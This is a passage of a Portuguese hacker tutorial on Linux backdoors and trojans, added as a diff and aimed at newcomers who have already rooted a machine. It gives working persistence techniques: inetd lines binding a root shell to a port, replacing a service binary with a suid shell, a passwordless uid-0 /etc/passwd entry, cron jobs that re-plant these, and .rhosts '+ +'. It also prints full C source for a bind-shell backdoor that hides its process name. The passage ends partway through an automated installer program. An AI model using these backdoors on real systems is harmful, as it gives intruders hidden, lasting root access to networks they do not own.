@@ -1,0 +1,2445 @@
+########################################################################
+######################### UNSEKURITY TEAM ##############################
+########################################################################
+
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+Thanks Unsekurity Team.
+
+Estes e outros tutoriais podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+AVISO: Nao nos responsabilizamos pelo mau uso das informacoes
+       disponibilizadas neste arquivo texto, bem como o mau uso dos
+       exemplos e dados aqui disponiveis.Todas as informacoes descritas
+       neste tutorial tem somente propositos educacionais.
+       
+
+Meu inimigo tempo vem vencendo muitas batalhas, mesmo sendo uma guerra
+cansativa, pretendo ainda disponibilizar muitos e muitos materiais, caso
+nao aconteca algo comigo,logico!! Muita gente tem acompanhado nossas
+publicacoes e opinado a respeito delas, acho isso mais do que valido,
+criticas,sugestoes sempre serao bem-vindas, tudo em prol de melhorarmos
+cada vez mais o modo como estamos abordando todos esses assuntos.
+Nesse txt abordaremos duas das mais conhecidas tecnicas fucadoras, nao sao
+tecnicas de invasao e sim tecnicas para permitir que futuras invasoes
+a mesma rede sejam mais faceis e sem obstaculos, as tecnicas de backdoor,
+tambem conhecidas como porta-dos-fundos e os famosos trojans horses
+(cavalos de troia), tudo voltado para o sistema operacional linux.
+Irei abordar algumas dessas tecnicas, umas consideradas basicas outras
+um pouco mais avancadas, mas como em todos os meus txts o publico alvo
+sao os NewBies de modo que se voce eh elite, este txt tambem 
+nao servirah para voce.
+
+
+		        ----------------------------
+		       |    BACKDOORS E TROJANS     | 
+			---------| PARTE 1 |--------
+				
+
+-------------------------------- INDICE ---------------------------------
+
+1. INTRODUCAO
+2. DIFERENCA ENTRE OS DOIS CONCEITOS
+3. BACKDOORS
+   3.1. Tecnicas Antigas e Ultrapassadas 
+   3.2. Tecnicas Mais Atuais
+   3.3. Rootkits
+   3.4. Sugestoes
+4. TROJANS HORSES
+   4.1. Alguns Tipos Basicos
+   4.2. Sugestoes
+5. TERMINANDO
+   5.1. Links e Referencias
+   5.2. Consideracoes Finais
+-------------------------------------------------------------------------
+
+
+--------------
+1. INTRODUCAO |
+--------------
+
+Backdoors e Trojans horses sao os programas mais pessoais que um fucador
+pode fazer.A simples divulgacao de varios tipos de backdoors e trojans
+fazem com que possiveis ataques usando esta tecnica sejam ineficientes.O
+melhor modo sempre foi a criatividade e isso fucadores possuem de sobra.
+Dependendo da perseveranca do fucador, essas backdoors e trojans podem de
+fato ser um problema de dificil solucao para um administrador de redes.
+Assim como acontece com os virus, a cada dia, essas tecnicas vao ficando
+cada vez mais sofisticadas, e muitas delas sao mantidas em total segredo
+por parte de seus idealizadores.Tendo em mente que voce eh um fucador
+descente e que nao usarah para fins maldosos em usuarios comuns, vou
+nesse simples tutorial descrever algumas das incontaveis tecnicas de
+backdoor e trojan horses, lembrando que eh para NewBie que eu escreve,e
+que estaremos trabalhando em sistemas linux, mas algumas dessas tecnicas
+bem como os proprios conceitos podem muito bem serem expandidos para
+outros sistemas operacionais, soh depende mesmo do fucador.Programacao
+em C, assim como nos tutoriais anteriores se faz necessario, um basico
+de assembler tambem cairia bem,mas nao eh necessario, ademais esperteza
+por parte do fucador eh mais do que exigida. 
+
+-------------------------------------
+2. DIFERENCA ENTRE OS DOIS CONCEITOS |
+-------------------------------------
+
+Muita gente confunde backdoor com trojan horse.Muitas vezes faz-se
+referencia a um quando na verdade eh o outro termo que estah em uso.Irei
+descrever a diferenca nos conceitos para que nao haja duvidas quanto aos
+termos, mas dependendo da forma como voce irah atacar, um programa
+considerado trojan pode agir como uma backdoor,mas vejamos o significado
+dos termos.
+
+* BACKDOOR -> (Porta dos fundos,porta de tras), Eh o termo dado a uma
+	      porta ou meio deixado por um fucador para acessos futuros
+	      ao sistema invadido no intuito de poupar trabalho, e
+	      consequentemente facilitar as coisas(invasoes) ao maximo.
+	      As Backdoors englobam um conjunto de programas que podem
+	      variar muito, indo de backdoors que abrem uma simples porta
+	      com acesso shell, ateh sofisticados rootkits capazes de
+	      automatizarem muitos processos para o fucador.Diferente dos
+	      trojans horses, as backdoors necessitam de acesso local a
+	      maquina, e em alguns casos o fucador necessita ter rootiado
+	      (conseguido acesso de super usuario) o sistema.Dependendo
+	      dos intuitos dos fucadores as backdoors podem ser tratadas 
+              como grandes problemas para os adminitradores e os 
+	      responsaveis pela seguranca das redes invadidas.Veremos isso
+	      em detalhes mais a frente.
+
+* TROJAN HORSE -> Trojans horses eh a moda do momento.Muita gente executa
+	      diversos tipos de trojans,principalmente em sistemas Windows,
+	      achando que isto eh uma forma efetiva de invasao.Os Trojans
+	      Horses, assim como as backdoors, sao conceitos e tecnicas
+	      antigas no mundo Unix, jah no mundo Windows, a popularizacao
+	      desta tecnica se deu em meados de 98(pouco tempo,nao?) com
+	      a divulgacao publica dos trojans NetBus e Back Orifice,se
+	      nao me engano seguindo as possiveis praticas do NetCat.
+	      Os Trojan Horses sao programas que geralmente sao enviados
+	      por algum usuario malicioso para uma vitima inexperiente.Na
+	      pratica, um trojan soh pode funcionar perfeitamente com o
+	      "consentimento" do usuario que o recebeu.Em sistemas Linux,
+	      como existem as permissoes de execucao e etc, as limitacoes
+	      que este tipo de tecnica pode possuir sao muitas, diferente
+	      do Windows onde um usuario executa o trojan e poe toda a
+	      rede em perigo.Os Trojans nada mais sao que "presentes de
+	      gregos"(Giria em portugues), sendo que sua variacao eh
+	      bastante ampla.Tenhamos em mente que uma backdoor eh feita 
+	      quando jah estamos com acesso na maquina vitima, e um trojan 
+              horse eh usado quando ainda nao estamos com acesso na maquina 
+	      vitima e queremos que algum usuario abra uma porta para que 
+              possamos entrar,logo enviamos o trojan e o sucesso que ele 
+	      poderah obter dependerah unicamente do usuario que o recebeu.
+
+Espero ter deixado claro os conceitos relacionados aos termos em questao.
+Vamos prosseguindo.
+
+
+-------------
+3. BACKDOORS |
+-------------
+
+Sem sombra de duvida, as backdoors sao tao fascinantes quanto qualquer
+outra tecnica usada por fucadores.A criatividade que envolve essa tecnica
+eh tanta, que muita gente considerada fazer uma backdoor nova uma arte.
+Invadir sistemas muitas vezes eh uma tarefa ardua e trabalhosa,as vezes
+leva-se dias,semanas e ateh meses para que uma investida a um sistema seja
+plenamente realizada e bem sucedida, uma vez dentro do sistema, o fucador,
+geralmente, nao quer perder mais aquele tao suado acesso a maquina de modo
+que ele trata de modificar o sistema para que no futuro ele consiga acesso
+com o minimo possivel de esforco, isso eh bastante comum quando se utiliza
+exploits remotos(em especial buffer overflows).
+As Backdoors sao bastante pessoais, muita gente possui tecnicas de fazer
+backdoors exclusivas, que ateh mesmo ninguem no mundo ainda conhece.O
+pessoal da seguranca possui conhecimento sobre a maioria das tecnicas mais
+divulgadas, mas isso nao impede que um dia voce possa descobrir uma nova
+tecnica que ainda nao foi divulgada internet a fora, por isso amigo,estude!
+
+
+3.1. Tecnicas antigas e ultrapassadas
+--------------------------------------
+
+"Se voce jah conhece estes tipos de backdoor, nao hesite em saltar para
+o proximo item, nao pense que eh muito agradavel ter que escrever isto
+aqui nao mano!"
+
+Eu nao iria escrever essas tecnicas, mas como eh voltado a NewBie, vou
+partir do pre-suposto que isto pode ser util para alguem ainda,mas jah
+adianto, eh bom apenas conhecer essas tecnicas, mas nao usa-las, pois 
+estao ultrapassadas, e na maioria das redes, elas sao de facil percepcao
+pelos administradores da rede.Mais abaixo iremos ver algumas tecnicas
+mais atuais e mais dificeis do administrador perceber facilmente.Alem do
+mais, algumas dezenas de grupos e pessoas jah escreveram materiais sobre 
+estas backdoors.
+
+3.1.1 - Inetd
+--------------
+
+Essa eh uma das mais classicas, sem sombra de duvida, 99 em cada 100
+administradores de redes "unix" possuem conhecimento dela, de modo que
+nao eh aconselhavel seu uso.Mas Veremos alguns modos de se construir uma
+backdoor deste tipo.
+
+Comece abrindo seu proprio arquivo /etc/inetd.conf.Vou disponibilizar
+abaixo dois tipos de arquivo /etc/inetd.conf, o primeiro de um sistema
+AIX, o outro de um sistema linux, irei colocar o do AIX para que voce
+possa comparar os dois arquivos somente.
+-------------------------------------------------------------------------
+## @(#)62	1.17.1.6  src/tcpip/etc/inetd.conf, tcpip, tcpip411, 
+## GOLD410 7/13/94 10:53:12
+## 
+## COMPONENT_NAME: TCPIP inetd.conf
+## 
+## FUNCTIONS: 
+##
+## ORIGINS: 26  27
+##
+## (C) COPYRIGHT International Business Machines Corp. 1993
+## All Rights Reserved
+## Licensed Materials - Property of IBM
+##
+## US Government Users Restricted Rights - Use, duplication or
+## disclosure restricted by GSA ADP Schedule Contract with IBM Corp.
+##
+#######################################################################
+##
+##                 Internet server configuration database
+##
+##	Services can be added and deleted by deleting or inserting a
+##	comment character (ie. #) at the beginning of a line  If inetd
+##	is running under SRC control then the "refresh -s inetd" command
+##	needs to be executed for inetd to re-read the inetd.conf file.
+##
+##	NOTE: The TCP/IP servers do not require SRC and may be started
+##	by invoking the service directly (i.e. /etc/inetd). If inetd
+##	has been invoked directly, after modifying this file, send a
+##	hangup signal, SIGHUP to inetd (ie. kill -1 "pid_of_inetd").
+##
+##	NOTE: The services with socket type of "sunrpc_tcp" and "sunrpc_udp"
+##	require that the portmap daemon be running.
+##	Also please use ## to designate comments in this file so that
+## 	the smit commands can edit this file correctly.
+##
+## service  socket  protocol  wait/  user    server    server program
+##  name     type             nowait         program     arguments
+##
+# nntp    stream  tcp     nowait  news    /usr/local/sbin/leafnode
+##
+telnet  stream  tcp     nowait  root    /usr/sbin/in.telnetd      telnetd
+shell   stream  tcp     nowait  root    /usr/sbin/rshd         rshd
+login   stream  tcp     nowait  root    /usr/sbin/rlogind      rlogind
+#exec    stream  tcp     nowait  root    /usr/sbin/rexecd       rexecd
+#pop3	stream	tcp	nowait	root	/usr/sbin/popper       popper -s
+# poppassd	stream	tcp	nowait	root	/usr/local/bin/poppassd poppassd
+#tacacs dgram udp wait root /etc/xtacacsd xtacacsd -dlc /etc/xtacacsd-conf
+#netbios-ssn stream tcp nowait root /usr/local/bin/smbd smbd
+#netbios-ns dgram udp wait root /usr/local/bin/nmbd nmbd
+#comsat dgram   udp     wait    root    /usr/sbin/comsat       comsat
+#uucp   stream  tcp     nowait  root    /usr/sbin/uucpd        uucpd
+#bootps	dgram   udp     wait    root    /usr/sbin/bootpd       bootpd /etc/bootptab
+##
+## Finger, systat and netstat give out user information which may be
+## valuable to potential "system crackers."  Many sites choose to disable
+## some or all of these services to improve security.
+##
+#finger stream  tcp     nowait  nobody  /usr/sbin/fingerd     fingerd
+#systat	stream	tcp	nowait	nobody	/usr/bin/ps           ps -ef
+#netstat stream	tcp	nowait	nobody	/usr/bin/netstat      netstat -f inet
+#
+#tftp	 dgram	udp	wait	nobody	/usr/sbin/tftpd		tftpd -n
+#talk   dgram   udp     wait    root    /usr/sbin/in.talkd         talkd
+#ntalk   dgram   udp     wait    root    /usr/sbin/talkd         talkd
+# 
+# rexd uses very minimal authentication and many sites choose to disable
+# this service to improve security.
+#
+#rexd	 sunrpc_tcp	tcp	wait	root	/usr/sbin/rpc.rexd rexd 100017 1
+#uucc     stream         tcp     nowait  root    /usr/sbin/uucc uucc -i
+echo	stream	tcp	nowait	root	internal
+discard	stream	tcp	nowait	root	internal
+#chargen	stream	tcp	nowait	root	internal
+#daytime	stream	tcp	nowait	root	internal
+#time	stream	tcp	nowait	root	internal
+#echo	dgram	udp	wait	root	internal
+ftp	stream	tcp	nowait	root	/usr/sbin/wu.ftpd wu.ftpd
+-----------------------------------------------------------------------
+
+Esse de cima eh a do AIX de uma rede amiga..:).. Voce pode notar na ultima
+linha que este admin teve a audacia de instalar um wu.ftpd num AIX!
+Abaixo a gente ve um /etc/inetd.conf de um Red Hat linux.
+
+-----------------------------------------------------------------------
+
+#
+# inetd.conf	This file describes the services that will be available
+#		through the INETD TCP/IP super server.  To re-configure
+#		the running INETD process, edit this file, then send the
+#		INETD process a SIGHUP signal.
+#
+# Version:	@(#)/etc/inetd.conf	3.10	05/27/93
+#
+# Authors:	Original taken from BSD UNIX 4.3/TAHOE.
+#		Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
+#
+# Modified for Debian Linux by Ian A. Murdock <imurdock@shell.portal.com>
+#
+# Modified for RHS Linux by Marc Ewing <marc@redhat.com>
+#
+# <service_name> <sock_type> <proto> <flags> <user> <server_path> <args>
+#
+# Echo, discard, daytime, and chargen are used primarily for testing.
+#
+# To re-read this file after changes, just do a 'killall -HUP inetd'
+#
+#echo	stream	tcp	nowait	root	internal
+#echo	dgram	udp	wait	root	internal
+#discard	stream	tcp	nowait	root	internal
+#discard	dgram	udp	wait	root	internal
+#daytime	stream	tcp	nowait	root	internal
+#daytime	dgram	udp	wait	root	internal
+#chargen	stream	tcp	nowait	root	internal
+#chargen	dgram	udp	wait	root	internal
+#
+# These are standard services.
+#
+ftp	stream	tcp	nowait	root	/usr/sbin/tcpd	in.ftpd -l -a
+telnet	stream  tcp 	nowait  root    /usr/sbin/tcpd	in.telnetd
+gopher	stream  tcp 	nowait  root    /usr/sbin/tcpd	gn
+
+# do not uncomment smtp unless you *really* know what you are doing.
+# smtp is handled by the sendmail daemon now, not smtpd.  It does NOT
+# run from here, it is started at boot time from /etc/rc.d/rc#.d.
+#smtp	stream  tcp 	nowait  root    /usr/bin/smtpd	smtpd
+#nntp	stream	tcp	nowait	root	/usr/sbin/tcpd	in.nntpd
+#
+# Shell, login, exec and talk are BSD protocols.
+#
+shell	stream	tcp	nowait	root	/usr/sbin/tcpd	in.rshd
+login	stream	tcp	nowait	root	/usr/sbin/tcpd	in.rlogind
+#exec	stream	tcp	nowait	root	/usr/sbin/tcpd	in.rexecd
+talk	dgram	udp	wait	root	/usr/sbin/tcpd	in.talkd
+ntalk	dgram	udp	wait	root	/usr/sbin/tcpd	in.ntalkd
+#dtalk	stream	tcp	waut	nobody	/usr/sbin/tcpd	in.dtalkd
+#
+# Pop and imap mail services et al
+#
+pop-2   stream  tcp     nowait  root    /usr/sbin/tcpd	ipop2d
+pop-3   stream  tcp     nowait  root    /usr/sbin/tcpd	ipop3d
+imap    stream  tcp     nowait  root    /usr/sbin/tcpd	imapd
+#
+# The Internet UUCP service.
+#
+#uucp	stream	tcp	nowait	uucp	/usr/sbin/tcpd	/usr/lib/uucp/uucico	-l
+#
+# Tftp service is provided primarily for booting.  Most sites
+# run this only on machines acting as "boot servers." Do not uncomment
+# this unless you *need* it.  
+#
+#tftp	dgram	udp	wait	root	/usr/sbin/tcpd	in.tftpd
+#bootps	dgram	udp	wait	root	/usr/sbin/tcpd	bootpd
+#
+# Finger, systat and netstat give out user information which may be
+# valuable to potential "system crackers."  Many sites choose to disable 
+# some or all of these services to improve security.
+#
+# cfinger is for GNU finger, which is currently not in use in RHS Linux
+#
+finger	stream	tcp	nowait	root	/usr/sbin/tcpd	in.fingerd
+#cfinger stream	tcp	nowait	root	/usr/sbin/tcpd	in.cfingerd
+#systat	stream	tcp	nowait	guest	/usr/sbin/tcpd	/bin/ps	-auwwx
+#netstat	stream	tcp	nowait	guest	/usr/sbin/tcpd	/bin/netstat	-f inet
+#
+# Time service is used for clock syncronization.
+#
+time	stream	tcp	nowait	nobody	/usr/sbin/tcpd	in.timed
+time	dgram	udp	wait	nobody	/usr/sbin/tcpd	in.timed
+#
+# Authentication
+#
+auth   stream  tcp     nowait    nobody    /usr/sbin/in.identd in.identd -l -e -o
+#
+# End of inetd.conf
+----------------------------------------------------------------------------
+
+Voce pode de cara ir percebendo a semelhanca.Isso eh logico, pois o
+inetd eh um servico unix padrao usado em muitos sistemas.Voce pode pegar
+o arquivo inetd.conf do AIX e colocar num linux que ele serah lido
+perfeitamente, o mesmo se dah em outros unix.
+
+Uma vez que voce obteve acesso ao sistema e conseguiu root nele, para
+fazer uma backdoor usando o inetd eh bastante simples.Irei descrever por
+menores da forma como o programa inetd interpreta ou entende este arquivo
+de configuracao.
+Pegaremos uma linha referente a um servico, por exemplo, finger:
+
+finger  stream  tcp     nowait  root    /usr/sbin/tcpd  in.fingerd
+
+Onde:
+
+finger -> nome do servico propriamente dito.
+
+stream -> Tipo de socket em que ele eh manipulado,caso tenha duvidas,leia
+	  meus tutoriais sobre programacao de sockets para linux.
+
+tcp -> Tipo de protocolo usado pelo socket.tcp usa stream.
+
+nowait -> Se espera quando alguem conectar, nesse caso nao.
+
+root -> O usuario que rodarah o processo,geralmente eh root
+
+/usr/sbin/tcpd -> PATH aonde se encontra o executavel referente ao servico.
+
+in.fingerd -> parametros para o servico,mas nesse caso,nao possui nenhum.
+
+
+A mesma definicao se aplica para as outras linhas referentes aos outros
+servicos.Eh por isso que um arquivo inetd dum AIX pode ser usado em um
+linux e vice-versa, pois seguem esta mesma notacao.
+
+Sabendo disso, tudo que devemos fazer eh alterar este mesmo arquivo para
+executar a nossa backdoor.Existem diversas formas de se fazer isso, irei
+descrever apenas algumas.
+
+* Acrescentar servico executando shell:
+---------------------------------------
+
+Voce pode acrescentar uma linha do tipo:
+
+ingreslock stream  tcp  nowait   root     /bin/sh     sh
+
+Isto farah com que seja aberta uma porta(1524) com shell root.
+
+* Acrescentar uma porta com shell:
+----------------------------------
+
+Segue o mesmo esquema descrito acima,mas ao inves de ingreslock colocamos
+o numero da porta que queremos abrir.Ex:
+
+20000 stream  tcp  nowait   root     /bin/sh     sh -i
+
+Esse -i eh uma opcao da shell "sh" para torna-la interativa.Teste.
+
+* Trocar o executavel de um servico:
+-------------------------------------
+
+Creio que para inetd este eh o esquema mais interessante, pelo menos que
+eu conheca.O que se faz eh trocar o arquivo executavel de um servico por
+outro.Um exemplo, poderia ser descrito numa rede aonde auth nao eh usado,
+ou usado muito pouco, teriamos:
+
+auth   stream  tcp     nowait    nobody    /usr/sbin/in.identd in.identd -l -e
+ 
+logo o executavel de auth se encontra em /usr/sbin/in.identd, renomeamos 
+ou movemos este arquivo em seguida copiamos uma shell para este Path, e
+alteramos o inetd.conf.Um esquema para isso segue abaixo:
+
+[Vitima@lamer.com]# cp /bin/sh /usr/sbin/in.identd
+[Vitima@lamer.com]# chmod 4777 /usr/sbin/in.identd
+
+Depois alteramos o inetd.conf:
+
+auth   stream  tcp     nowait    nobody    /usr/sbin/in.identd in.identd
+
+Basta isso.Reiniciamos e veremos que nos temos uma shell root na porta
+do auth(113).
+
+Esse esquema eh bom somente se um servico nao estah sendo usado, ou eh
+muito pouco requisitado, geralmente quem deixa auth aberto eh pq o usa
+muito, mas o mesmo conceito pode ser aplicado aos outros servicos.
+
+3.1.2 - Acrescentar Usuario com uid e gid 0 no /etc/passwd Sem Senha
+---------------------------------------------------------------------
+
+Se voce der uma analisada na estrutura de seu arquivo /etc/passwd notarah
+algumas coisas.O arquivo /etc/passwd possui o seguinte esquema:
+
+<login>:<senha>:<uid>:<gid>:<dados pessoais>:<diretorio home>:<shell>
+
+Acho que nao preciso nem explicar o significado destes campos.Nesse tipo
+de backdoor, o invasor, apos conseguir root, acrescenta ou altera dados
+referente a um usuario.Ele poderia, por exemplo, fazer o seguinte:
+
+[Vitima@lamer.com]# echo "hacker::0:0::/:/bin/sh" >> /etc/passwd
+
+Acrescentaria um usuario de login igual a "hacker" sem senha e com uid e
+gid iguais a zero(root).
+
+Mas isso eh muito conhecido, e muitas vezes, o que o invasor faz eh
+acrescentar um usuario com dados validos, sem uid e gid iguais a zero,
+somente sem senha.Ou mesmo retirar a senha de um usuario jah perfeitamente
+cadastrado no sistema, para isso, basta retirar aquele "x" ou "*" que se
+encontra apos o login.
+
+
+3.1.3 - Crond
+--------------
+
+Este metodo tambem eh bem velho e conhecido.O crond eh um daemon que
+serve para executar determinadas tarefas em determinados momentos(hora,
+tempo,etc..).Uma vez conseguido acesso root, poderiamos utilizar o 
+crond de um sistema para executar uma backdoor numa determinada hora.
+A programacao de tarefas usando o crond eh facil, basta criarmos um
+arquivo de configuracao(conhecido como crontab) de um usuario, no nosso
+caso o que vai nos interessar eh o root.O arquivo segue o seguinte
+esquema:
+
+<time-date> <command>
+
+Onde:
+<time-date> consiste em cinco campos numericos, cada um separado por
+espacos, e indicam quando uma tarefa deve ser executada.Os cinco campos
+(em ordem), sao:
+
+* Minute -> Para os minutos(0 a 59).
+* Hour -> Para as horas(0 a 23).
+* Day of Month -> Para os dias do mes(0 a 31).
+* Month -> Para os meses do ano(0 a 12 ou as primeiras tres letras do
+	   nome do mes).
+* Day of Week -> Para os dias da semana(0 a 7 ou as tres primeiras letras
+		 do  nome do dia).
+
+Exemplo de um arquivo crontab segue abaixo:
+
+0   1   *   *   *  /usr/local/bin/backup
+30  14  2  feb  *  /usr/local/bin/backup
+
+Na primeira linha, o comando "/usr/local/bin/backup" eh realizado todo dia
+as 1 hora da madrugada, na segunda linha ele eh realizado todo dia 2 de
+fevereiro as 14 horas e 30 minutos.
+Para carregar este arquivo basta digitarmos:
+
+[vitima]# crontab <nome_do_arquivo>
+
+Sabendo disso entao poderemos finalmente usar o crond para nossos
+intuitos.Vejamos abaixo alguns exemplos do uso desse daemon como backdoor:
+
++ Criamos um arquivo com nossas configuracoes, exemplo:
+
+30 01 * * fri /bin/echo "hacker::0:0::/:/bin/sh" >> /etc/passwd
+
+No exemplo acima, toda sexta-feira as 1 e 30 da madrugada eh acrescentado
+um usuario "hacker" com uid e gid 0 no arquivo passwd.
+
+0 23 5 * * /bin/echo "20000 tcp stream nowait root /bin/sh sh -i" >> /etc/inetd.conf
+2 23 5 * * /bin/killall -1 inetd
+
+No exemplo acima, todo dia 5 de cada mes as 23 horas eh acrescentado um
+servico no /etc/inetd.conf que binda uma root shell a porta 20000, e 2 
+minutos apos isso, o inetd eh reiniciado para que a backdoor possa ser
+inicializada.
+
+Como podemos ver, existem algumas dezenas de possiveis esquemas para
+backdoor via crond.Mas como todas as backdoors descritas neste item, esta
+tambem jah eh amplamente difundida e de facil percepcao.
+
+3.1.4 - Links do /etc/passwd 
+-----------------------------
+
+Esta backdoor consiste em linkar o arquivo de senhas(passwd, shadow, etc)
+a um arquivo qualquer que possa ser lido no futuro por qualquer usuario.
+Vejamos alguns possiveis exemplos disso:
+
++ Linkando o /etc/passwd para um arquivo .forward de fingerd.
+
+[Vitima@lamer.com]# ln  /etc/passwd /home/hacker/.forward
+[Vitima@lamer.com]# chmod 4777 /home/hacker/.forward
+
+Nesse caso necessita-se da abertura do fingerd no sistema local(Acreditem,
+ainda existem muitos sistemas com isso aberto!!Que diga uma grande
+Biblioteca Nacional!!:)).Feito isso, tudo que o fucador precisa fazer para 
+ler este arquivo passa eh digitar "finger Vitima@lamer.com".
+
+
+3.1.5 Copia do /bin/sh, /bin/bash ou qualquer outro tipo de shell
+-------------------------------------------------------------------
+
+Nesse Esquema nao tem segredo Nenhum.Tudo que o atacante precisa fazer, eh
+como usuario root copiar uma determinada shell p/ um arquivo qualquer e
+depois transforma-la em suid.Um esquema para isso seria, com acesso a uma
+conta qualquer, o atacante executar os seguintes passos:
+
+[Vitima@lamer.com]# cp /bin/bash /home/hacker/quimera.txt
+[Vitima@lamer.com]# chmod +s /home/hacker/quimera.txt
+ 
+Pronto.Depois, num futuro acesso como o usuario "hacker" tudo que ele
+precisarah fazer eh digitar ./quimera.txt no seu diretorio home.Existem
+dezenas de esquemas melhores p/ isso, alguns copiam a shell p/ o diretorio
+/tmp ou /var/log/ ou qualquer diretorio onde no futuro ele saberah que irah
+ter acesso.Sistemas novos nao permitem mais isso, mas existem maneiras de
+se burlar essas restricoes, veja no item de backdoors mais avancadas um
+esquema para burlar isso.
+
+
+3.1.5 - .rhosts
+----------------
+
+O Servico rlogind(513) permite que um determinado usuario se logue sem a
+necessidade de senha.Hoje em dia existem pouquissimas redes que ainda
+utilizam este servico, em especial algumas universidades que tambem
+utilizam sistemas NFS.De qualquer forma, eh uma tecnica bastante antiga
+e muito, muito conhecida.Este servico procura no diretorio home um arquivo
+chamado .rhosts com configuracoes(permissoes) de acesso a este servico.
+Se o arquivo existe, as configuracao sao estabelecidas, senao, nada feito.
+Uma vez obtido root, ou mesmo acesso a shell, se o servico login(513) estah
+habilitado, tudo que o invasor necessita fazer para permitir eventuais
+acessos futuros eh criar um arquivo .rhosts no diretorio home desejado.
+Vejamos um esquema abaixo para isso:
+
+[Vitima@lamer.com]# cd /root
+[Vitima@lamer.com]# echo '+ +' >> .rhosts
+
+Pronto.No exemplo acima, criamos o arquivo no diretorio do root, seria
+pedir para o root achar essa backdoor, melhor esquema eh criar este
+arquivo num diretorio de um usuario qualquer.Criado o arquivo, em
+investidas futura, da sua rede, basta voce digitar:
+
+$rlogin <host_com_a_backdoor> -l <usuario_dono_do_dir_home>
+
+[NewBie]$ rlogin redelamer.com -l root
+
+Logico.Assim como as outras, nao eh nada aconselhavel o uso desse
+esquema, a nao ser para acesso rapido a um servidor.
+
+3.1.6 - Backdoor Numa Porta Alta
+---------------------------------
+
+No tutorial sobre sockets, primeira parte, eu disponibilizei um esquema
+de backdoor muito difundida na internet.Eh uma backdoor que binda uma
+shell para uma determinada porta e camufla o argv[0] para dificultar a
+percepcao do root em eventuais investigacoes do sistema.Abaixo segue
+o codigo fonte deste programa, caso se interesse em saber como este
+programa eh feito, vejo o tutorial sobre escrita de sockets em C para
+linux que fiz na home page do Unsekurity Team.
+
+--------------------------Backdoor usando Socket-------------------------
+
+/* Backdoor em Socket simples...by Nash Leon
+   Thanks Ramona e  Unsekurity Team.
+   nashleon@yahoo.com.br
+   http://unsekurity.virtualave.net
+   Compile usando:
+   $gcc -o back back.c
+*/
+
+/* HEADERS */
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <strings.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <signal.h>
+
+#define MINHA_PORTA 20000 /* A porta do servidor */
+#define BACKLOG        5 /* Ateh quantas conexoes */
+
+int main(int argc, char *argv[])
+{
+
+   int Meusocket, Novosocket, tamanho;
+   struct sockaddr_in local;
+   struct sockaddr_in remote;
+if(fork() == 0){
+
+/* Aqui segue a esperteza..se alguem der ps aux,top, ou ver os processos
+   que estao rodando verah o que estah copiado abaixo,no caso [kflushd],
+   mude isso conforme o sistema onde serah executada a backdoor */
+
+   strcpy(argv[0], "[kflushd]");
+   signal(SIGCHLD, SIG_IGN);
+
+   bzero(&local, sizeof(local));
+   local.sin_family = AF_INET;
+   local.sin_port = htons(MINHA_PORTA);
+   local.sin_addr.s_addr = INADDR_ANY;
+
+   bzero(&(local.sin_zero), 8);
+
+Meusocket=socket(AF_INET, SOCK_STREAM, 0);
+bind(Meusocket, (struct sockaddr *)&local, sizeof(struct sockaddr));
+listen(Meusocket, BACKLOG);
+tamanho = sizeof(struct sockaddr_in);
+
+while(1)
+ {
+if((Novosocket=accept(Meusocket, (struct sockaddr *)&remote,&tamanho))
+     {
+             perror("accept");
+             exit(1);
+      }
+      if(!fork())
+          {
+       close(0); close(1); close(2);
+       dup2(Novosocket, 0); dup2(Novosocket, 1); dup2(Novosocket,2);
+      execl("/bin/bash","bash","-i", (char *)0);
+      close(Novosocket);
+      exit(0);
+          }
+
+     }
+   }
+   return(0);
+}
+
+---------------------------------------------------------------------
+
+Aih estah um esquema para backdoor bindando uma shell para a porta 20000
+no caso.Este esquema tambem eh muito conhecido, de facil percepcao, mas
+funciona ainda.Soh um detalhe, se nao aceita shell interativa, quando
+der telnet e mandar os comandos, use ponto e virgula(;) no final de cada
+comando enviado.
+
+Essas daih sao as backdoors mais conhecidas.Em muitos sistemas hoje em
+dia existem limitacoes consideraveis.Por Exemplo, em alguns linux, o
+link para o .forward nao funciona mais, pois o fingerd jah filtra, a
+copia da shell /bin/bash tornando-a um arquivo "suid" nao funciona, pois
+alguns sistemas jah utilizam um artificio conhecido como getuid().Mas
+isso nao eh um motivo para desanimar.Veremos esquemas bem mais eficazes
+do que estes, que vimos acima.Gostaria que voce desse uma analisada no
+programa abaixo, ele nao eh pratico, mas serve para exemplificar as 
+backdoors que vimos acima.
+
+------------------------------nlback.c----------------------------------
+
+/* SIMPLES PROGRAMA AUTOMATIZADOR DE BACKDOORS ULTRAPASSADAS.
+   EXECUTA E INSTALA ALGUMAS DAS MAIS CONHECIDAS BACKDOORS.
+   DESENVOLVIDO POR NASHLEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+   Thanks Unsekurity Team.
+   http://unsekurity.virtualave.net/
+   OBS: Este programa possui propositos educacionais.Foi Escrito
+	para demonstracao de teorias de backdoors.Leia o tutorial
+	sobre backdoors e trojans horses na home page citada acima
+	para que possa entender os processos.Lembrando que o autor
+	deste programa nao se responsabiliza pelo mau uso do mesmo.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define  ERRO	-1
+
+int inetd();
+int crond();
+int passw();
+int forward();
+int suid();
+int rlog();
+int binda();
+void uso(char *nome);
+
+FILE *arquivo;
+
+main(int argc, char *argv[]){
+char *opcao;
+if(argc != 2){
+uso(argv[0]);
+exit(0);
+}
+if(geteuid() != 0){
+printf("Voce nao eh root mano!!\n");
+printf("Nesse Esquema voce necessita ser!!\n");
+printf("Leia tutorial sobre Backdoor e Trojans Horse!!\n");
+exit(ERRO);
+}
+opcao = argv[1];
+if(!strcmp(opcao,"inetd")){
+inetd();
+}
+if(!strcmp(opcao,"crond")){
+crond();
+}
+if(!strcmp(opcao,"passw")){
+passw();
+}
+if(!strcmp(opcao,"fowar")){
+forward();
+}
+if(!strcmp(opcao,"suid")){
+suid();
+}
+if(!strcmp(opcao,"rlog")){
+rlog();
+}
+if(!strcmp(opcao,"binda")){
+binda();
+}
+if(!strcmp(opcao,"todas")){
+system("clear");
+printf("***** Instalando Todas As Backdoors *****\n\n");
+inetd();
+crond();
+passw();
